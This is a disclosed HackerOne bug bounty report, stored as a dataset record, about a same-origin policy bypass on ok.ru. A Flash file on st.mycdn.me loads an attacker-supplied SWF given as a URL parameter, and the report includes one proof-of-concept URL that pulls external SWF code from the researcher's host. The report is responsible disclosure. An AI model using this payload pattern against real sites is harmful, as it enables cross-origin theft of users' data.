---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '102236'
original_report_id: '102236'
title: 'Same-Origin Policy Bypass #2'
team_handle: ok
created_at: '2015-11-27T02:56:17.259Z'
disclosed_at: '2016-05-04T12:31:53.532Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
---

# Same-Origin Policy Bypass #2

## Metadata

- HackerOne Report ID: 102236
- Weakness: 
- Program: ok
- Disclosed At: 2016-05-04T12:31:53.532Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

This is really similar issue to my previous report #102234 - exploitation mechanism is really same but other swf file is vulnerable. All conditions are met: 

- st.mycdn.me domain which is in ok.ru crossdomain.xml
- Security.allowDomain('*')
- possibility to execute own SWF code provided by URL parameter.

Example of swf code execution: https://st.mycdn.me/static/moderator/6-1-6/Main.swf?retry_timer=30&skip_timer=8500&disableAgeCheck=true&v=55&player=https://uid0.pl/poc/xss.swf (shoud execute same code like https://uid0.pl/poc/xss.swf)

I know this report is much sorter and less detailed than previous one. I also belive I don't need to explain it again because all is in previous report and exploit mechanism is really the same... BUT if you want me to prepare different PoC for this case - no problem at all. 

Have a nice day,
JZ

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
